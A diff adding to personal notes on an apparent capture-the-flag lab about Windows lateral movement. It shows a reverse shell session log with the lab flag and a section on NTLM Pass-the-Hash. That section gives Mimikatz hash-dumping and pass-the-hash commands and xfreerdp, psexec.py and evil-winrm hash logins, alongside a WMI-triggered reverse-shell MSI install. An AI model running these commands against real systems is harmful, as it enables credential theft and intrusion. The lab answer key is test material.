@@ -466,7 +466,7 @@ Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Insta
 }
 ```
 
-Legacy WMIC
+On Legacy WMIC
 ```
 wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
 ```
@@ -509,7 +509,135 @@ This is used to execute a reverse shell MSI payload.
      ```
 - Invoke MSI installation via WMI → triggers reverse shell.
   ```
-  PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+  PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation =   "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
   ```
 - On THMIIS reverse shell, run flag.exe on t1_corine.waters desktop.
+```
+[*] Started reverse TCP handler on 10.150.74.7:4445 
+[*] Command shell session 1 opened (10.150.74.7:4445 -> 10.200.74.201:60504) at 2026-07-05 15:56:03 +1000
+
+
+Shell Banner:
+Microsoft Windows [Version 10.0.17763.1098]
+-----
+          
+
+C:\Windows\system32>cd "c:\users\t1_corine.waters\desktop"
+cd "c:\users\t1_corine.waters\desktop
+...
+2022/06/17  18:52            58�368 Flag.exe
+2026/07/05  04:51                66 flag_output.txt
+...
+# Text file is nothing of interest
+c:\Users\t1_corine.waters\Desktop>type flag_output.txt
+type flag_output.txt
+Sorry! You are still missing something. No flag for you yet. (1)
+
+c:\Users\t1_corine.waters\Desktop>flag.exe
+flag.exe
+THM{MOVING_WITH_WMI_4_FUN}
+
+
+c:\Users\t1_corine.waters\Desktop>
+```  
 - Submit the flag.
+
+## Task 5: Alternate Authentication Material & Pass‑the‑Hash
+
+Alternate authentication material refers to anything that lets you authenticate as a Windows user without knowing their password. This is possible because Windows authentication protocols (NTLM and Kerberos) rely on reusable cryptographic material such as password hashes or tickets.
+
+This section focuses on NTLM authentication and how attackers use NTLM hashes to authenticate as a user — a technique known as Pass‑the‑Hash (PtH).
+
+### How NTLM Authentication Works
+
+NTLM is a challenge‑response protocol:
+
++-----------+                 +-----------+                 +-------------------+
+|   Client  |                 |   Server  |                 | Domain Controller |
++-----------+                 +-----------+                 +-------------------+
+     |                              |                                |
+     |----(1) Authentication Req --->|                                |
+     |                              |                                |
+     |<---(2) NTLM Challenge --------|                                |
+     |                              |                                |
+     |----(3) NTLM Response -------->|                                |
+     |                              |                                |
+     |                              |----(4) Send Challenge & Resp -->|
+     |                              |                                |
+     |                              |<---(5) Allow / Deny Auth -------|
+     |<---(6) Allow / Deny Auth ----|                                |
+     |                              |                                |
+     +---------------------------------------------------------------+
+
+
+- 1. Client requests authentication.
+- 2. Server sends a random challenge.
+- 3. Client uses NTLM password hash + challenge to compute a response.
+- 4. Server sends challenge + response to the Domain Controller.
+- 5. DC recomputes the response using the stored NTLM hash.
+- 6. If they match → authentication succeeds.
+
+Key point:  
+
+The NTLM hash itself is enough to compute the correct response.
+You do not need the plaintext password.
+
+### Pass‑the‑Hash (PtH)
+
+If you extract NTLM hashes from a machine, you can authenticate as that user without cracking the hash.
+
+PtH works because NTLM authentication only needs the hash, not the password.
+
+#### How attackers obtain NTLM hashes:
+
+1. Local SAM dump (local accounts only)
+2. LSASS memory dump (local + domain accounts that logged in recently)
+
+Example Mimikatz commands:
+
+```
+privilege::debug
+token::elevate
+lsadump::sam
+```
+
+```
+sekurlsa::msv
+```
+
+### Using PtH with Mimikatz
+
+Mimikatz can inject a token using a stolen NTLM hash:
+```
+sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"<command>"
+```
+This launches a process (e.g., reverse shell) authenticated as the victim user.
+
+Even though whoami may still show your original username, all commands run under the injected credentials.
+
+### PtH from Linux
+
+Several tools support NTLM hash authentication:
+
+RDP
+```
+xfreerdp /v:<IP> /u:<DOMAIN\User> /pth:<NTLM_HASH>
+```
+PsExec (Linux version only)
+```
+psexec.py -hashes <NTLM_HASH> <DOMAIN>/<User>@<IP>
+```
+WinRM
+```
+evil-winrm -i <IP> -u <User> -H <NTLM_HASH>
+```
+These allow full remote access using only the NTLM hash.
+
+### Core Takeaway
+
+NTLM hashes are authentication material.
+If NTLM authentication is enabled, you can authenticate as a user without knowing their password — simply by possessing their NTLM hash.
+
+This is the foundation of Pass‑the‑Hash, a major lateral movement technique in Windows networks.
+
+
